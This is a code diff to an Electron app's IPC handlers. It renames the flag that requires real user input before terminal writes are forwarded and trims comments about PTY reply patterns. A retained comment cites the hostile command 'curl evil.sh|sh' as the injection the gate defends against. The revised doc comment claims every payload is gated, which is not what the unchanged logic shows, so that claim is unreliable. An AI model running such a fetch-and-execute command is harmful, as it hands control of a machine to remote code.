@@ -269,12 +269,11 @@ type ChannelSpec =
   | (ChannelSpecBase & {
       kind: 'send'
       /**
-       * Requires recent real OS input before a payload that would SUBMIT a
-       * command line (one containing a newline) is forwarded. Payload-scoped
-       * rather than channel-scoped because the same channel also carries
+       * Requires recent real OS input before a payload is forwarded. Payload-
+       * scoped rather than channel-scoped because the same channel also carries
        * terminal replies the PTY solicits, which arrive with no user input.
        */
-      submitNeedsDeliberateInput?: boolean
+      payloadNeedsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
@@ -324,12 +323,9 @@ function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean
 }
 
 /**
- * Replies the PTY solicits and the terminal must answer unprompted.
- *
- * DSR cursor position and device attributes (`CSI … R` / `CSI … c`), focus
- * reports (`CSI I` / `CSI O`, mode 1004 — set by tmux and vim), X10 and SGR
- * mouse reports, and DCS/OSC responses. All machine-generated and
- * self-delimiting, which is what makes them safe to enumerate.
+ * Replies the PTY solicits and the terminal must answer unprompted. All
+ * machine-generated and self-delimiting, which is what makes them safe to
+ * enumerate.
  */
 const PTY_REPLY_PATTERNS = [
   /\u001b\[[0-9;?]*[Rc]/, // DSR cursor position, device attributes
@@ -966,21 +962,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (typeof terminalId !== 'string' || typeof data !== 'string') return
         deps.terminal.write(terminalId, data)
       },
-      // Only a submit is gated, never the whole channel.
-      //
-      // This carries xterm.js's entire upstream stream, and much of it is not
-      // typing at all: the PTY solicits replies the terminal must answer
-      // unprompted — DSR cursor position (`CSI 6n`, which p10k/starship emit on
-      // every prompt), device attributes, focus reports (mode 1004, set by both
-      // tmux and vim), mouse reports. Requiring recent input for those would
-      // silently break the reply protocol and leave a program waiting forever
-      // for an answer it will never get.
-      //
-      // A raw write only becomes command execution on the trailing `\r`, so that
-      // is what needs a person behind it: an XSS'd or hostile origin must not
-      // reach `write(id, 'curl evil.sh|sh\r')`. Panel focus is deliberately not
-      // used — `terminal:focused` is a renderer-asserted claim the same attacker
-      // can set.
+      // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
+      // Panel focus is deliberately not used — `terminal:focused` is a
+      // renderer-asserted claim the same attacker can set.
       //
       // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
       // line buffer, where the user's own next Enter submits it — visible on
@@ -988,7 +972,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       // the renderer surface entirely (main writing the keystrokes it already
       // observes) or the terminal in its own WebContents, neither of which is a
       // gate change. Tracked as follow-up.
-      submitNeedsDeliberateInput: true,
+      payloadNeedsDeliberateInput: true,
     },
     'terminal:resize': {
       kind: 'send',
@@ -1107,7 +1091,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       ipcMain.on(channel, (event, ...args) => {
         if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
         if (
-          spec.submitNeedsDeliberateInput &&
+          spec.payloadNeedsDeliberateInput &&
           needsDeliberateInputForWrite(args) &&
           !hasRecentDeliberateInput(event.sender)
         ) {
